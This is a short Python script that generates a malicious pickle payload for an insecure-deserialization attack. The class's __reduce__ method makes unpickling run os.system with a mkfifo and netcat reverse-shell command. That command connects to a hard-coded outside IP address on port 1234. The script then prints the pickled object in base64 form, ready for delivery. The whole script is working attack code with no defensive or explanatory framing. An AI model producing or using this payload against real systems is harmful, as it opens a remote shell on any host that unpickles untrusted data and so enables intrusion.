import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 86.126.24.38 1234 > /tmp/f')
        # cmd = ('ls')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    bb = (base64.urlsafe_b64encode(pickled).decode("utf-8"))
    print(bb)
    # data = base64.urlsafe_b64decode(bb)
    # deserialized = pickle.loads(data)
